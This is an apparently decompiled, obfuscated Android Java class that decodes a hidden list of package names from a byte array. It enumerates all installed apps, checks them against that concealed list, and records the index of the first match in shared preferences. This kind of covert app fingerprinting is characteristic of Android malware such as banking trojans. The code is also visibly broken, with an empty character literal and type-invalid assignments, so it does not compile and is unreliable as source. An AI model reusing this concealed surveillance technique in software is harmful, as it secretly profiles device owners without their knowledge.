package com.gwm.juo;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.preference.PreferenceManager;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;

public final class va
{
  private static String fy;
  private static final byte[] ir;
  private static int ln;
  
  public va() {}
  
  private static String fy()
    throws Exception
  {
    String str = fy;
    int i = (byte)ir[59];
    byte b = (byte)ir[9];
    if (str.equals(fy(i, b, b).intern())) {
      return ch.fy(fy(yr.fy.length), ir(yr.fy.length));
    }
    return fy(0);
  }
  
  private static String fy(int paramInt)
  {
    return fy.substring(yr.fy.length - yr.fy.length, fy.length() - paramInt);
  }
  
  private static String fy(int paramInt, byte paramByte, short paramShort)
  {
    byte[] arrayOfByte1 = ir;
    paramInt += 4;
    byte b = 100 - paramByte * 2;
    paramByte = 0;
    int j = 0;
    int k = 9844 - paramShort * 9839;
    byte[] arrayOfByte2 = new byte[k];
    paramShort = paramByte;
    short s = paramInt;
    paramByte = b;
    if (arrayOfByte1 == null)
    {
      paramByte = paramInt;
      paramShort = paramInt;
      paramInt = j;
    }
    for (;;)
    {
      paramByte += b;
      s = paramShort;
      paramShort = paramInt;
      s += 1;
      int i = (byte)paramByte;
      paramInt = paramShort + 1;
      arrayOfByte2[paramShort] = i;
      if (paramInt == k) {
        return new String(arrayOfByte2, 0);
      }
      b = arrayOfByte1[s];
      paramShort = s;
    }
  }
  
  private static List<String> fy(Context paramContext, boolean paramBoolean)
  {
    ArrayList localArrayList = new ArrayList();
    paramContext = paramContext.getPackageManager().getInstalledPackages(yr.fy.length - yr.fy.length);
    int i = 0;
    while (i < paramContext.size())
    {
      PackageInfo localPackageInfo = (PackageInfo)paramContext.get(i);
      if ((paramBoolean) || (localPackageInfo.versionName != null)) {
        localArrayList.add(localPackageInfo.packageName);
      }
      i += 1;
    }
    return localArrayList;
  }
  
  private static void fy(Context paramContext, int paramInt)
  {
    paramContext = PreferenceManager.getDefaultSharedPreferences(paramContext).edit();
    int i = (byte)ir[''];
    byte b = (byte)ir[125];
    paramContext.putInt(fy(i, b, b).intern(), paramInt).apply();
  }
  
  public static boolean fy(Context paramContext)
    throws Exception
  {
    List localList = ir(fy());
    return fy(paramContext, fy(paramContext, false), localList);
  }
  
  private static boolean fy(Context paramContext, List<String> paramList1, List<String> paramList2)
  {
    int i = 0;
    while (i < paramList1.size())
    {
      int j = 0;
      while (j < paramList2.size())
      {
        if (((String)paramList1.get(i)).equals((String)paramList2.get(j)))
        {
          fy(paramContext, j);
          return true;
        }
        j += 1;
      }
      i += 1;
    }
    return false;
  }
  
  public static boolean fy(String paramString)
    throws Exception
  {
    return fy().contains(paramString);
  }
  
  private static String ir(int paramInt)
  {
    int i = (byte)ir[59];
    byte b = (byte)ir[9];
    String str = fy(i, b, b).intern();
    i = (byte)ir[59];
    b = (byte)ir[9];
    return str.substring(fy(i, b, b).intern().length() - paramInt);
  }
  
  private static List<String> ir(String paramString)
  {
    paramString = new StringTokenizer(paramString);
    ArrayList localArrayList = new ArrayList(paramString.countTokens());
    while (paramString.hasMoreTokens()) {
      localArrayList.add(paramString.nextToken().trim());
    }
    return localArrayList;
  }
}
